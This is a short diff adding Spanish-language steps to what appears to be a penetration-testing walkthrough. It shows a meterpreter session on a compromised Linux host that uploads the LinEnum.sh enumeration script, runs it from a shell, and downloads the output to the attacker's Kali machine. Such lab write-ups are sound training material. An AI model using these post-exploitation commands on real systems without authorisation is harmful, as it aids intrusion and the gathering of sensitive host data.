@@ -295,4 +295,16 @@ meterpreter > cd /tmp
 meterpreter > upload /path/LinEnum.sh
 ```
 
+Lo ejecutamos de la siguiente forma:
 
+```bash
+meterpreter > shell
+usr@hostname# chmod +x LinEnum.sh
+usr@hostname# ./LinEnum.sh > linenum.txt
+```
+
+Descargamos los resultados a nuestra máquina kali:
+
+```bash
+meterpreter > download linenum.txt
+```
